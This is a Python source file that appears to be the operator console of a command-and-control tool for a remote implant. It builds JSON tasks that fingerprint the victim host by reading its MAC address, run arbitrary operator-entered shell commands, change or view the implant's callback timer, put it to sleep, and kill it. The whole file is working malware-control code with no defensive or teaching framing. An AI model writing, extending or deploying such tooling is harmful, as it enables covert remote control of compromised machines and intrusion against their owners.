import json


def BuildTask(data):
    raw_reply = data.decode()
    reply = json.loads(raw_reply)
    if (reply["Type"] == "init"):
        task = '{"id": 1, "task": "cat /sys/class/net/*/address | head -n 1"}'
        replyMsg = str.encode(task)
        print(reply)
    else:
        if ("data" in reply):
            print(reply["data"])
        uuid = reply["id"] + 1
        Type, cmd, value = TaskType()
        if (cmd == 0):
            json_to_load = {"id": uuid, "Type": Type, "task": "admin_tasker"}
        elif (cmd == 1):
            json_to_load = {"id": uuid, "Type": Type, "task": "admin_tasker", "value": value}
        elif (cmd == 2):
            json_to_load = {"id": uuid, "Type": Type, "task": "admin_sleep"}
        elif (cmd == 3):
            json_to_load = {"id": uuid, "Type": Type, "task": "KillImplant"}
        else:
            json_to_load = {"id": uuid, "Type": Type, "task": cmd}
            print("Tasking Implant " + str(uuid) + " to run: " + cmd + "\n\nOutput:\n")
        json_final = json.dumps(json_to_load)
        replyMsg = str.encode(json_final)

    return replyMsg


def TaskType():
    print("What do you want to do?\n")
    for i in range(0, 4):
        print("1. Task\n")
        print("2. Change Callback Time\n")
        print("3. View Current Callback Time\n")
        print("4. Stop Interaction\n")
        print("5. Kill Implant\n")


        while True:
            choice = int(input("Enter a number: "))
            if choice not in range(1,6):
                print("Error: Input not valid. Please enter just the number of what you wish to do")
            else:
                break

        if (choice == 1):
            Type = "task"
            cmd = input("Enter command to task: \n")
            value = 0
            return Type, cmd, value

        if (choice == 2):
            Type = "ChangeTimer"
            cmd = 1
            value = int(input("What do you want to change the callback to in hours?\n"))
            return Type, cmd, value
 
        if (choice == 3):
            Type = "ViewTimer"
            cmd = 0
            value = 0
            return Type, cmd, value
        
        if (choice == 4):
            Type = "SleepNow"
            cmd = 2
            value = 0
            return Type, cmd, value
        
        if (choice == 5):
            Type = "KillImplant"
            cmd = 3
            value = 0
            return Type, cmd, value

        else:
            quit()

    else:
        quit()
